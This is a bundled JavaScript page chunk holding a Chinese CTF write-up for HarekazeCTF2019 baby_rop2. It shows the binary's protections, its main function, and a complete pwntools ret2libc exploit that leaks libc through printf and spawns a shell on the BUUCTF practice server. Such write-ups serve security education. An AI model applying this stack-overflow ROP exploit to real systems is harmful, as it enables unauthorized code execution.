(window.webpackJsonp=window.webpackJsonp||[]).push([[41],{365:function(t,s,a){"use strict";a.r(s);var n=a(4),r=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"harekazectf2019-baby-rop2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#harekazectf2019-baby-rop2"}},[t._v("#")]),t._v(" HarekazeCTF2019_baby_rop2")]),t._v(" "),s("h2",{attrs:{id:"前提"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#前提"}},[t._v("#")]),t._v(" 前提")]),t._v(" "),s("h3",{attrs:{id:"查看文件保护"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#查看文件保护"}},[t._v("#")]),t._v(" 查看文件保护")]),t._v(" "),s("div",{staticClass:"language-shell line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'/root/pwn/buuctf/HarekazeCTF2019_baby_rop2/babyrop2'")]),t._v("\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0x400000"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br")])]),s("h2",{attrs:{id:"静态分析"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#静态分析"}},[t._v("#")]),t._v(" 静态分析")]),t._v(" "),s("p",[t._v("主函数如下")]),t._v(" "),s("div",{staticClass:"language-c line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-c"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" __cdecl "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" argc"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("argv"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("envp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("init")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("argc"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" argv"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" envp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("vuln")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br")])]),s("h2",{attrs:{id:"思路分析"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#思路分析"}},[t._v("#")]),t._v(" 思路分析")]),t._v(" "),s("ol",[s("li",[t._v("目前信息：\n"),s("ul",[s("li",[t._v("明显的栈溢出漏洞")]),t._v(" "),s("li",[s("code",[t._v("plt")]),t._v("内无"),s("code",[t._v("system")])]),t._v(" "),s("li",[t._v("无/"),s("code",[t._v("bin/sh")]),t._v("字符串")]),t._v(" "),s("li",[t._v("No PIE")])])]),t._v(" "),s("li",[t._v("思路：\n"),s("ul",[s("li",[s("code",[t._v("ret2libc")]),t._v("做法")])])])]),t._v(" "),s("h2",{attrs:{id:"exp"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#exp"}},[t._v("#")]),t._v(" exp")]),t._v(" "),s("div",{staticClass:"language-python line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" pwn "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" LibcSearcher "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\ncontext"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("os"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'linux'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" arch"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'amd64'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" log_level"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'debug'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\npwnfile "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'/root/pwn/buuctf/HarekazeCTF2019_baby_rop2/babyrop2'")]),t._v("\nio "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" remote"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'node4.buuoj.cn'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("29266")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# io = process(pwnfile)")]),t._v("\nelf "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" ELF"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pwnfile"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\npadding "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x20")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),t._v("\npop_rdi_ret "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x400733")]),t._v("\npop_rsi_r15_ret "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x400731")]),t._v("\nformat_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x400770")]),t._v("\nprintf_plt "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" elf"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("plt"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'printf'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\nlibc_start_main_got "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" elf"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("got"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'__libc_start_main'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\nmain_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" elf"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("symbols"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'main'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\npayload "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'a'")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("padding"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" pop_rdi_ret"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" format_addr"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" pop_rsi_r15_ret"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("libc_start_main_got"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0xdeadbeef")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" printf_plt"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" main_addr"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nio"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendafter"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"What\'s your name? "')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" payload"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nleak_libc_start_main "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" u64"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("io"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recvuntil"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\x7f'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("ljust"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("b'\\x00'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nlibc "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" LibcSearcher"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'__libc_start_main'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" leak_libc_start_main"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nlibcbase "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" leak_libc_start_main"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("libc"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("dump"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'__libc_start_main'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nsystem "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" libcbase"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("libc"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("dump"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'system'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nbin_sh "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" libcbase"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("libc"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("dump"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'str_bin_sh'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\npayload "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'a'")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("padding"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" pop_rdi_ret"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" bin_sh"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" system"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nio"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendafter"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"What\'s your name? "')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" payload"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nio"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("interactive"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br"),s("span",{staticClass:"line-number"},[t._v("11")]),s("br"),s("span",{staticClass:"line-number"},[t._v("12")]),s("br"),s("span",{staticClass:"line-number"},[t._v("13")]),s("br"),s("span",{staticClass:"line-number"},[t._v("14")]),s("br"),s("span",{staticClass:"line-number"},[t._v("15")]),s("br"),s("span",{staticClass:"line-number"},[t._v("16")]),s("br"),s("span",{staticClass:"line-number"},[t._v("17")]),s("br"),s("span",{staticClass:"line-number"},[t._v("18")]),s("br"),s("span",{staticClass:"line-number"},[t._v("19")]),s("br"),s("span",{staticClass:"line-number"},[t._v("20")]),s("br"),s("span",{staticClass:"line-number"},[t._v("21")]),s("br"),s("span",{staticClass:"line-number"},[t._v("22")]),s("br"),s("span",{staticClass:"line-number"},[t._v("23")]),s("br"),s("span",{staticClass:"line-number"},[t._v("24")]),s("br")])])])}),[],!1,null,null,null);s.default=r.exports}}]);